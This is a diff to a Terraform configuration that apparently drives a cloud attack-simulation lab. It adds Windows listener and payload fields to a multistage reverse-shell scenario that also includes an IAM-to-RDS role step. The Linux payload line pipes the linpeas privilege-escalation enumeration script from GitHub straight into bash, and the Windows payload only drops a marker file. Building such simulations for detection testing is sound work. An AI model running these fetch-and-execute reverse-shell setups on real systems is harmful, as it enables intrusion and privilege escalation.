@@ -151,7 +151,9 @@ variable "config" {
                 enabled                     = bool
                 listen_ip                   = string
                 listen_port                 = number
+                windows_listen_port         = number
                 payload                     = string
+                windows_payload             = string
                 iam2rds_role_name           = string
                 iam2rds_session_name        = string
                 attack_delay                = number
@@ -445,7 +447,9 @@ variable "config" {
                 enabled                     = bool
                 listen_ip                   = string
                 listen_port                 = number
+                windows_listen_port         = number
                 payload                     = string
+                windows_payload             = string
                 iam2rds_role_name           = string
                 iam2rds_session_name        = string
                 attack_delay                = number
@@ -1044,8 +1048,10 @@ variable "config" {
               reverse_shell_multistage = {
                 enabled                     = false
                 listen_ip                   = "0.0.0.0"
-                listen_port                 = "4444"
+                listen_port                 = 4444
+                windows_listen_port         = 4445
                 payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
+                windows_payload             = "if (Test-Path \"C:\\Windows\\Temp\\pwned.txt\") { (Get-Item \"C:\\Windows\\Temp\\pwned.txt\").LastWriteTime = Get-Date } else { New-Item -ItemType File -Path \"C:\\Windows\\Temp\\pwned.txt\" }"
                 iam2rds_role_name           = "rds_user_access_role_ciemdemo"
                 iam2rds_session_name        = "attacker-session"
                 attack_delay                = 50400
@@ -1338,8 +1344,10 @@ variable "config" {
               reverse_shell_multistage = {
                 enabled                     = false
                 listen_ip                   = "0.0.0.0"
-                listen_port                 = "4444"
+                listen_port                 = 4444
+                windows_listen_port         = 4445
                 payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
+                windows_payload             = "if (Test-Path \"C:\\Windows\\Temp\\pwned.txt\") { (Get-Item \"C:\\Windows\\Temp\\pwned.txt\").LastWriteTime = Get-Date } else { New-Item -ItemType File -Path \"C:\\Windows\\Temp\\pwned.txt\" }"
                 iam2rds_role_name           = "rds_user_access_role_ciemdemo"
                 iam2rds_session_name        = "attacker-session"
                 attack_delay                = 50400
